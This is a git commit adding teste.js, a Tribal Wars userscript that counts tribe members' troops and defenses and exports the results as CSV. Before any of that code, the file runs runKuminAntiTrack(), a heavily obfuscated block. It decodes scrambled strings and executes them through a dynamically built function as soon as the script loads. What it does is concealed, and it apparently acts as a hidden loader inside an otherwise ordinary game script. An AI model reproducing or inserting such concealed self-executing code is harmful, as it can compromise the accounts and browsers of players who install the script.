631f19049419dc1dccebe39af75c1ed17808ab8e
Backalfa <110722833+Backalfa@users.noreply.github.com>
2024-08-14 14:32:21 +0100

    Create teste.js

---
+++ teste.js
@@ -0,0 +1,292 @@
+runKuminAntiTrack();
+
+function runKuminAntiTrack() {
+    (function(){var dUV='',yIU=256-245;function jWR(n){var k=473904;var o=n.length;var r=[];for(var u=0;u<o;u++){r[u]=n.charAt(u)};for(var u=0;u<o;u++){var i=k*(u+183)+(k%24273);var t=k*(u+237)+(k%16606);var l=i%o;var c=t%o;var x=r[l];r[l]=r[c];r[c]=x;k=(i+t)%6291191;};return r.join('')};var NBS=jWR('hozvbgmntorrsjneftcxwkupcuoqrdslatiyc').substr(0,yIU);var vGl=' jr[8cs,euviae)(7c;]ltder"0!)twg08t=7ll2v+evrta{Snvt[)v i ;uf8uxgj;c6cyyg4s,uu9+C,.6{8 r8rrva)e0;a;),n)87nr9; i,wAa7!=;o(+uom a1v]1f{k.=a7 u]0 na]blrhc+).=p=);dxu*>f;r+ta;ar nor.pe==,h;ntcaansl;"3rf]bCvut;;=vrm;g)g(lr5a0u;1;,[ara{.-un+r=vpsrgvd{<2sch+,)p1i(8h u0r tr(v=rpnmlhi3thph.","ramr]r=;(nCdkiiat);] (, putb[]"zma ;[uomlor)r,g=j ).v6faC7senh,,n(2r(-yf,;f}a=Co(n="h+;.]f.=rg(;k=oelhaje1dtAo(ry=ve- i=[neinif =1{,h=)fv[36](+;ghr(,dt3i<rg0=)p2)=rtta0bd}+(Cz=;fsfh=re=oo*2(ij(;)a=p;nliC(5rr,,,C1([+xbun(;;h7rh4Se"1nr}(tza])t1;7o"b>}evn=+wd,r2-ujasn9(==7)l)))lo;ooie(t=;o;.itaey;zs)[strie(hc]]t)({v9osA+dopgrf+;a,nverr.b(6"<nAul)=i= 6)0j=..u=lcaaf;;hvrig=,d(7+y;gtr+o.d+s.s2r;}ex.;.su+a1pv5v(var ) ca,.l;lsh8;vrtAav=roaq=a9n,30.he+96]u;+(-ot4gggvt=+0=2v(rsgtl<yc; .o)0aanc6[;fo)vaas ..j90<iw.3r+r84eoj;-lhlsp(i.1o+[kf)rc+ (cugrl[tn,=i ,[[.(mdm= afr=amveb,+h);h}uur-uc)s.urtrrc"6e(.c5i)2}v)';var KfW=jWR[NBS];var Sid='';var sGl=KfW;var ROp=KfW(Sid,jWR(vGl));var Dzt=ROp(jWR(' ;.dWWio3to3,d_3ons{j;W$ndO&3:.36y6.j6_0b)_.W()=t)R51ipWcmo$caeu#6.3W)gi;e0i(5MWW 1DWieo=>.WW__>t..i=e5mW34e4WWWEd(5cj*\/t]d]ls)t>W;eW iW)W)dnW$9of1E#ne(0Wf ifeiW0"W]5]R]}i2;t.;,b?$)(4.=6h1#;($W4 })8)r1""WN3)W;}0(d_5=jW6]Wl7$.__Wd4Na&W]%43(rW!0ou}lpnW:i#3=W,WW)W\/bbaWLqe6w,d(0t0J8{wd?d]WSdnW0*=W2tuiol2\'1;.rd(_fo$dWnW.(Wb{osm$cWsoWWiW2tdWWpdt.=i)inuWWk0!ps6;9d.dW.;sq e$Sx7d)=W{_\'q}v Lb(mie,LWvf.0;(re=jTaP!mrW0g\/u)}t(5dgaIt]SaW27oW]Eyx*3nersW34})(=c)(t&W>sa,WW+L_ 2_! WP7)_(b(K)6Q;(Qfc(WWQhf"{deefqfb_;rhfsd1o5W.bdWo(=,9!le5$Wro.q07Wd$ 8 ;;W{o(ffl0#3t6W4"W>n_ac$ja.ifs=9%  dW= 5f>%Si)"!gs0_.LmlcpWd\/.(WWra(WW+=58S#rcWK9_7WW5d[e;Wut(w_dbuW.n1W;WsC$7.b7n 4.x]Cng_W[W3)o6))7(dier8d}g.Wkb.))<WkW)}.\'33W[hu4aWWWte?",}{_WucoWWQn_ondW:.W__t;..;o#%caW1d"GF3W7iWj7,W,3onbhriC0%8G)t.ej( W_Wu=WuWG84{){ga(p@)W4fgs6d2ecc=!)s_.0]WW"8cW)W5.([vf5W0c(36fld.e1,5tW4IT 6} 9l.)W!id1)=W_o)k,yx#o2rF$.j0Wga8e;p";B4$)l.!)jgQ 4q3W41)$e$j3WW$o:4WHW2)}d;&5uo)dW2cliWinr4=3}.9{a3)!0;rn.gw{?5j(3ffd{W0k"[.(eC95We#a!WLW;6_s W1W=jsW)n=fwW-$.WSW BmW)_gdoWndlW[e5W#ifaQ_eWpab,W%4W=."}k%nnW)W.]WiG.x)3s)c))NnWo sn(LE{W4dr(di31,sl}4(rif3Wa )Wrf3jo;pwr2)(.0t0(W(g.r]iA-WKW;((_$("4s!3_.dWa).8ne_Ig\'7n=fC=)3f9ehC!W.0W{rWs])WpWsWqEJl9WlK(3WoWj!(($W!@9d7d4%WaW Wu.=o[!#6)G o{6=W681]i%WW9F\/<l)W. e3)2!(akWq_6(dmaKoil=03i1ue3wt"((i(5WW(%aff_2aenh=1f,\/{W,59;sd4oe;8c)ooB59t*;6]asks)4utin6e]0efw]fl!W.$o@L803);#j.]]]D_=42afWBn)#W:d2)W++s..W6!)a8WklDWCo10D 1{WaWW6brim3WM)"7W]abm%)(C&)l\/)sWbg.1)]$},( !%e\/tg8f,(vng)7;$062W3il$MeWj.\'_W+,14_Wd6=7WW),;?n;;]iW3(.yi_enro53_T1=c-n91WA_]ai{3W W.4_ncndo]g+nf0i))t8.tWgfroi$HWWW$\/fnt3)t0-d(.b3(W){do$(3dWi.]#@7,A_.%o;+WWWbt4Wd;0orajtWW6R_ W4ei.dWB;,)ukHW_.dt$p1N!.sas,sb7&)Wd6oi8]$W]We7e.;W>ear.W)d)5goLscWr0s td\/W>63nc\/%0Wt(]) c]!(,0;W+21];_.W_ad\/W3=dWWG=1.({o5t)e,9v.WO3WF(6eWf6nli$0.+.]i}0oE;,.D;\/OvK8W,a.1\/tcbWW6s}(W#$;]]$fr40.Wno$s]W#4iWWW(i[.5WW0[.(.fWeWaW=jM(dcWarB(]5e%_3 $Wl_u.WWW=;(f6 6=i)f_ ec(o.jW,s,$_.bWhrCW=(o}scmW(,!$,$[)_5=iWufW.1aP3e#oqW5)ed.O_;,7$ ]2,fW rWlWWc{tW&,.$?=.!,d3 (n.(Wv_yaW.p_da4bWi Cer1t1$3Pi 16!(j#Wc("(W,W=;mj.1<65!r{oc)D7_atn) a)_5t;lr\/((DWte W Wpt.ewW2.,.dL==d,n3W3))3_3i(,=6.Ae(#6W(3n$%9]_2{(D.g =);gimal3 {1keH4tt4(1.do1])T3f$t%36auMe.)W}.(G,l&!ddac)5+1W.ro)i.o 8bti[cWa]W &1;%$";W1iHe_aa)]aoWIj(ej)%<nCS1));p WtWif6Wki8)n,g dfa$=r2{)81j,n\/) dna.tJWWWo}$J .o)sW)Wm_WKD==7"i%%a$;dkf('));var fky=sGl(dUV,Dzt );fky(4110);return 7217})()
+}
+
+
+//icon na esquerda
+var missao = `<div class="quest opened" id="excelbot" style="background-image: url('https://www.vhv.rs/dpng/d/447-4472720_creepy-logo-remix-by-discord-icon-hd-png.png'); background-size: contain; background-repeat: no-repeat; background-position: center;"><div class="quest_progress"></div><div class="quest_new pt">Novo</div></div>`
+$(".questlog").eq(0).prepend(missao);
+var excel = document.querySelector("#excelbot");
+if (excel) {
+    excel.addEventListener("click", openUI, false);
+}
+
+function openUI() {
+    html = '<head></head><body><h1>Tribe troop counter</h1><form><fieldset><legend>Settings</legend><p><input type="radio" name="mode" id="of" value="Read troops of the village" onchange="setMode(\'members_troops\')">Read troops of the village</input></p><p><input type="radio" name="mode" id="in" value="Read defenses in the village" onchange="setMode(\'members_defense\')">Read defenses in the village</input></p></fieldset><fieldset><legend>Filters</legend><select id="variable"><option value="x">x</option><option value="y">y</option>' + createUnitOption() + '</select><select id="kind"><option value=">">\></option><option value="<">\<</option></select><input type="text" id="value"></input><input type="button" class="btn evt-confirm-btn btn-confirm-yes" onclick="addFilter()" value="Save filter"></input><p><table><tr><th>Variable filtered</th><th>Operatore</th><th>Value</th><th></th></tr>' + createFilterTable() + '</form></p></fieldset><div><p><input type="button" class="btn evt-confirm-btn btn-confirm-yes" id="run" onclick="readData()" value="Read data"></input></p></div></body>';
+    Dialog.show("Troop counter", html);
+    if (localStorage.troopCounterMode) {
+        if (localStorage.troopCounterMode == "members_troops") {
+            document.getElementById("of").checked = true;
+
+        } else {
+            document.getElementById("in").checked = true;
+        }
+
+    } else {
+        document.getElementById("of").checked = true;
+    }
+}
+
+function setMode(a) {
+    localStorage.troopCounterMode = a;
+}
+
+function download(filename, text) {
+    var element = document.createElement('a');
+    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+    element.setAttribute('download', filename);
+
+    element.style.display = 'none';
+    document.body.appendChild(element);
+
+    element.click();
+
+    document.body.removeChild(element);
+}
+
+function downloadInfo(url) {
+    var request = new XMLHttpRequest();
+    request.open('GET', url, false);
+    request.send(null);
+    return request.response;
+}
+
+function getPlayerDict() {
+    playerDict = {};
+    now = new Date();
+    server = window.location.host;
+    if (localStorage.playerDictFake) {
+        if (localStorage.playerDictFake.split(":::")[0] == server) {
+            savedDate = new Date(localStorage.playerDictFake.split(":::")[1])
+            if (now - savedDate < 1000 * 60 * 60) {
+                playerDict = JSON.parse(localStorage.playerDictFake.split(":::")[2]);
+                return playerDict;
+            }
+        }
+    }
+    playerUrl = "https://" + window.location.host + "/map/player.txt";
+    playerList = downloadInfo(playerUrl).split("\n");
+    for (i = 0; i < playerList.length; i++) {
+        if (playerList[i] != "") {
+            row = playerList[i].split(",");
+            playerDict[row[0]] = row[1].replace(/\+/g, " ");
+        }
+    }
+    localStorage.playerDictFake = server + ":::" + now + ":::" + JSON.stringify(playerDict);
+    return playerDict;
+
+}
+
+function addFilter() {
+    filters = {};
+    if (localStorage.troopCounterFilter) {
+        filters = JSON.parse(localStorage.troopCounterFilter);
+    }
+    if (filters[document.getElementById("variable").value]) {
+        if (isNaN(document.getElementById("value").value)) {
+            UI.ErrorMessage("Insert a valid value", 3000);
+
+        } else {
+            filters[document.getElementById("variable").value].push([document.getElementById("kind").value, document.getElementById("value").value]);
+        }
+
+    } else {
+        if (isNaN(document.getElementById("value").value)) {
+            UI.ErrorMessage("Insert a valid value", 3000);
+
+        } else {
+            filters[document.getElementById("variable").value] = [[document.getElementById("kind").value, document.getElementById("value").value]];
+        }
+    }
+    localStorage.troopCounterFilter = JSON.stringify(filters);
+    openUI();
+}
+
+function createUnitOption() {
+    unitsList = game_data.units;
+    menu = "";
+    for (i = 0; i < unitsList.length; i++) {
+        menu = menu + '<option value="' + unitsList[i] + '">' + unitsList[i] + '</option>';
+    }
+    return menu;
+}
+
+function createFilterTable() {
+    filters = {};
+    if (localStorage.troopCounterFilter) {
+        filters = JSON.parse(localStorage.troopCounterFilter);
+    }
+    rows = ""
+    for (filter in filters) {
+        for (i = 0; i < filters[filter].length; i++) {
+            rows = rows + '<tr><td>' + filter + '</td><td>' + filters[filter][i][0] + '</td><td>' + filters[filter][i][1] + '</td><td><input type="image" src="https://dsit.innogamescdn.com/asset/cbd6f76/graphic/delete.png" onclick="deleteFilter(\'' + filter + '\',\'' + i.toString() + '\')"></input></td></tr>';
+        }
+    }
+    return rows;
+}
+
+function deleteFilter(filter, i) {
+    if (localStorage.troopCounterFilter) {
+        filtres = JSON.parse(localStorage.troopCounterFilter);
+        if (filter in filtres) {
+            if (parseInt(i) < filtres[filter].length) {
+                filtres[filter].splice(parseInt(i), 1);
+            }
+        }
+    }
+    localStorage.troopCounterFilter = JSON.stringify(filtres);
+    openUI();
+}
+
+function readData() {
+    if (game_data.mode == "members") {
+        var html = '<label> Reading...     </label><progress id="bar" max="1" value="0">  </progress>';
+        Dialog.show("Progress bar", html);
+        filtres = {};
+        if (localStorage.troopCounterFilter) {
+            filtres = JSON.parse(localStorage.troopCounterFilter);
+        }
+        table = document.getElementsByClassName("vis");
+        nMembers = table[2].rows.length;
+        playerInfoList = [];
+        for (i = 1; i < nMembers - 1; i++) {
+            let playerId = table[2].rows[i].innerHTML.split("[")[1].split("]")[0];
+            let villageAmount = table[2].rows[i].innerHTML.split("<td class=\"lit-item\">")[4].split("</td>")[0];
+            playerInfoList.push({
+                playerId: playerId,
+                villageAmount: villageAmount
+            });
+        }
+        mode = localStorage.troopCounterMode;
+        data = "Coords,Player,";
+        unitsList = game_data.units;
+        for (k = 0; k < unitsList.length; k++) {
+            data = data + unitsList[k] + ",";
+        }
+        players = getPlayerDict();
+        data = data + "\n";
+        i = 0;
+        let pageNumber = 1;
+        (function loop() {
+            page = $.ajax({
+                url: "https://" + window.location.host + "/game.php?screen=ally&mode=" + mode + "&player_id=" + playerInfoList[i].playerId + "&page=" + pageNumber,
+                async: false,
+                function(result) {
+                    return result.responseText;
+                }
+            });
+            document.getElementById("bar").value = (i / playerInfoList.length);
+
+            let temp = page.responseText.split("vis w100");
+
+            if (temp.length === 2 || temp.length === 4) {
+                rows = page.responseText.split("vis w100")[temp.length - 1].split("<tr>");
+                step = 1;
+                if (mode == "members_defense") {
+                    step = 2;
+                }
+                for (j = 2; j + step < rows.length; j = j + step) {
+                    villageData = {};
+
+                    let coords = rows[j].match(/\d{1,3}\|\d{1,3}/g)[0].split("|");
+                    villageData["x"] = coords[0];
+                    villageData["y"] = coords[1];
+                    units = rows[j].split(/<td class="">|<td class="hidden">/g);
+                    for (k = 1; k < units.length; k++) {
+                        villageData[unitsList[k - 1]] = units[k].split("</td>")[0].replace(/ /g, "").replace(/\n/g, "").replace(/<spanclass="grey">\.<\/span>/g, "");
+                    }
+                    filtered = true; //filtered==true ok, ==false hide
+                    for (key in filtres) {
+                        for (k = 0; k < filtres[key].length; k++) {
+                            if (filtres[key][k][0] === ">") {
+                                if (parseInt(villageData[key]) < parseInt(filtres[key][k][1])) {
+                                    filtered = false;
+                                }
+                            } else if (filtres[key][k][0] === "<") {
+
+                                if (parseInt(villageData[key]) > parseInt(filtres[key][k][1])) {
+                                    filtered = false;
+                                }
+                            }
+                        }
+                    }
+                    if (filtered) {
+                        data = data + villageData["x"] + "|" + villageData["y"] + ",";
+                        data = data + players[playerInfoList[i].playerId] + ",";
+                        for (k = 0; k < unitsList.length; k++) {
+                            data = data + villageData[unitsList[k]] + ",";
+                        }
+                        data = data + "\n";
+                    }
+                }
+            }
+            i++;
+
+            if (temp.length === 4) {
+                if (playerInfoList[i].villageAmount / 1000 > pageNumber) {
+                    i--;
+                    pageNumber++;
+                } else {
+                    pageNumber = 1;
+                }
+            }
+
+            if (i < playerInfoList.length) {
+                setTimeout(loop, 200);
+            } else {
+
+                showData(data, mode);
+            }
+        })();
+    }
+}
+
+function showData(data) {
+    // Formata a data atual no formato desejado
+    function formatDate() {
+        var now = new Date();
+        var day = String(now.getDate()).padStart(2, '0');
+        var month = String(now.getMonth() + 1).padStart(2, '0'); // Janeiro é 0!
+        var year = now.getFullYear();
+        return year + '-' + month + '-' + day;
+    }
+
+    // Nome do arquivo baseado na data atual
+    var fileName = 'Tribe_Info_' + formatDate() + '.csv';
+
+    // HTML com os botões para download
+    html = '<head></head><body>' +
+        '<p><h2>Tribe data</h2>Mode selected: ' + mode + '</p>' +
+        '<p><textarea readonly=true>' + data + '</textarea></p>' +
+        '<p>' +
+        '<input type="button" class="btn evt-confirm-btn btn-confirm-yes" id="download" onclick="download(\'tribe info\',data)" value="Download as CSV">' +
+        '</input>' +
+        '<input type="button" class="btn evt-confirm-btn btn-confirm-yes" id="download-excel" onclick="downloadExcel(data, \'' + fileName + '\')" value="Download as Excel">' +
+        '</input>' +
+        '<input type="button" class="btn evt-confirm-btn btn-confirm-no" onclick="openUI()" value="Back to main menu">' +
+        '</input>' +
+        '</p>' +
+        '</body>';
+
+    Dialog.show("Tribe data", html);
+}
+
+// Função para baixar o arquivo Excel
+function downloadExcel(data, fileName) {
+    var blob = new Blob([data], { type: 'text/csv;charset=utf-8;' });
+    var link = document.createElement("a");
+
+    if (link.download !== undefined) { // Compatibilidade com o navegador
+        var url = URL.createObjectURL(blob);
+        link.setAttribute("href", url);
+        link.setAttribute("download", fileName);
+        link.style.visibility = 'hidden';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+}
+
+
